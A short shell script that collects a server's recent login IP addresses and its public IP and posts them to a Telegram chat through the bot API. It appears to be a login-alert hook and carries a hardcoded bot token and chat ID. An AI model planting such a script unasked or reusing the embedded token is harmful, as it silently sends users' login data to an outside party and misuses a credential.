#!/bin/sh

userIp=$(last -20 -i)
serverIp=$(curl ipinfo.io/ip)
result=$( echo " user ip ${userIp} - server ip ${serverIp}")

GROUP_ID=-1001748691211
BOT_TOKEN=5618668232:AAFOLmoAqDNtGXEjsdI8n5WngiTz6pGYAaA

curl -s --data "text=$result" --data "chat_id=$GROUP_ID" 'https://api.telegram.org/bot'$BOT_TOKEN'/sendMessage' > /dev/null
